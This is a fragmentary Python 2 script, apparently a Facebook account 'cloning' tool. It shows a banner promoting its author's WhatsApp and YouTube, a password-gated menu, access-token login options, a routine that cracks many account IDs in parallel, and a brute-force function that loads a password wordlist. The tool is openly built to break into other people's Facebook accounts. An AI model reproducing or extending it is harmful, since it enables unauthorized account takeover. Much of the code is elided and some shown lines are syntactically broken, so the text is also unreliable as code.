#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To kashi teach
...
##### LOGO #####
logo = """
\033[1;91m _______  _____  _   _  _  ___   
\033[1;97m(_____  )(  _  )( ) ( )(_)(  _`\ 
\033[1;95m     /'/'| (_) || |_| || || | ) |
\033[1;93m   /'/'  |  _  ||  _  || || | | )
\033[1;94m /'/'___ | | | || | | || || |_) |
\033[1;96m(_______)(_) (_)(_) (_)(_)(____/'
                                             
\033[1;91m-->Whtsapp Num:+92 313 3917585

\033[1;92m-->  :- Note I am father of cloners

\033[1;93m--> YOUTUBE :- Kashi Teaches and Technical zone 
...
\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)l
"""
logo19 = """
\033[1;91m _______  _____  _   _  _  ___   
\033[1;97m(_____  )(  _  )( ) ( )(_)(  _`\ 
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
    	password = 
("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #kashi:
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCHGgTVOflLjHVUklk8izqDA')
    else:
...
def pilih_login():
	...
	if peak =="":
		...
		login1()
	        ...
	        os.system('xdg-open https://anastasiakashif.blogspot.com/2020/11/how-get-free-facebook-access-token.html')
	        login()
	elif peak =="3":
	        tokenz()
	elif peak =="0":
...
def pilih_crack():
	...
	p.map(main, id)
	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
	print "  Written By Qaiser" #Kashi-Teach
	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
        print '\033[1;92mType (python2 Zahid.py) New Fb Start Cloning\033[1;92m....'
...
\033[1;92m ERROR ID AFTER 1 WEEKS (07DAYS)
...
def brute():
    ...
    try:
        ...
        try:
            ...
            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> Zahid.list) \x1b[1;95m: \x1b[1;95m')
            total = open(passw, 'r')
